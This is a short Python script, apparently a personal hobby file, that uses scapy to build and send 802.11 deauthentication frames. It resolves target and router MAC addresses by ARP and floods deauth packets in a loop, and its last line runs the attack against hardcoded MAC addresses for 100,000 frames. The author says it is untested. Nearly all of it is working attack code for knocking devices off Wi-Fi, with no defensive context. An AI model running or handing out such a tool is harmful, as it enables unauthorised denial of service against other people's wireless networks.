#!/bin/python3
# This code is untested, and i am unsure if it works
# NIC supporting monitor mode required for this to work, which is currently unavailable for me

import scapy.all as scapy
from time import sleep


def ipToMAC(ipAddress):
    arpFrame = scapy.ARP(pdst=ipAddress)
    etherFrame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Send to broadcast address

    arpRequest = etherFrame/arpFrame
    
    nodesFound = scapy.srp(arpRequest, verbose=False)[0] 
    
    return nodesFound[0][1].hwsrc


def deauth(targetIPAddrress, routerIPAddrress):
    targetMACAddress = ipToMAC(targetIPAddrress)
    routerMACAddress = ipToMAC(routerIPAddrress)

    try:
        dot11 = scapy.Dot11(type=0, subtype=12, addr1=targetMACAddress, addr2=routerMACAddress, addr3=routerMACAddress) # Type = 0 means management packet, and subtype=12 means packet is a deauthentication packet
        
        # Deauth packet codes here:
        # Lakshmanan, S., 2013. 802.11 Association Status, 802.11 Deauth Reason codes. [online] Community.cisco.com. Available at: <https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055> [Accessed 11 May 2021].
        dot11deauth = scapy.Dot11Deauth(reason=7)
        
        deauthPacket = scapy.RadioTap() / dot11 / dot11deauth # Combine all parts of final packet together
        print(targetMACAddress, routerMACAddress)
        try:
            while True:
                sleep(0.5)
                scapy.sendp(deauthPacket, verbose=False)
        except KeyboardInterrupt:
            print("Stopping deauth on ", targetIPAddrress)


    
    except IndexError:
        print("Index Error. IP addrresses may be wrong.")



def deauth_me(target , bssid):
    dot11 = scapy.Dot11(addr1=target, addr2=bssid, addr3=bssid)
    frame = scapy.RadioTap()/dot11/scapy.Dot11Deauth()

    frame.show()

    scapy.sendp(frame, iface="enp0s3", count=100000, inter=0.90)
    

    pass

deauth_me("80:2b:f9:7b:f3:61", "b0:4e:26:ad:35:60")